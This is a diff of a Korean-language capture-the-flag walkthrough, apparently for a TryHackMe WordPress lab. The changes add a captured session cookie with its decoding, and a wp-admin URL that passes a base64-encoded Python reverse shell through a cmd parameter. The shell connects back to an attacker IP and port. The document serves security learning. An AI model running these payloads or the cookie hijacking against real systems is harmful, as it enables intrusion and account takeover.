@@ -320,9 +320,25 @@ require_once ABSPATH . 'wp-settings.php';
 
 ```
 
-# 탈취한 정보로 로그인
+# login
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/1d998ee7-0c88-412b-b447-5103a27aa833/image.png)
+
+# Cookie Hijacking
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/f69cf5b3-c40e-4218-8d4c-afd383ab1e87/image.png)
+
+# 쿠키 원본
+
+Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070
+
+# 디코딩
+
+echo "wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
+
+# 결과
+
+wpuser|1753668949|cPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv|ccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070
 
 # 사이트 탐색 중 시스템 접근을 위한 데이터 수집
 
@@ -500,7 +516,7 @@ cmd
 └─# printf "\143\155\x64"
 cmd
 
-# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행한다는 것을 알 수 있음 -> 그렇다면 악성 RCE 명령어를 base64 로 encode 만 하면 될 것으로 보임
+# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행 -> js는 php cmd 를 실행 -> 그렇다면 악성 RCE 명령어를 base64 로 encode 만 하면 될 것으로 보임
 
 echo -n "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")" | base64
 
@@ -518,16 +534,17 @@ VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
 dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
 KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
 
+http://www.smol.thm/wp-admin/?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
+VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
+dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
+KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
+
 # fail -> maybe directory listing...? -> 분명히 플러그인이 취약점인데..!
 
 No such file or directory
 bash: VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k: command not found
 bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v: command not found
 
-# http://www.smol.thm/wp-admin/index.php -> 관리자 페이지 전체에서 플러그인 사용하는 것 확인
+# http://www.smol.thm/wp-admin/index.php -> 관리자 페이지에서 플러그인 사용하는 것 확인 -> cmd 취약점이 가능한 페이지 찾기
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/203b4452-c71a-414a-b29c-86e95d1b2a8f/image.png)
-
-# second Attempt payload -> 403 ? -> reverse shell gogo!
-
-http://www.smol.thm/wp-admin/profile.php?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
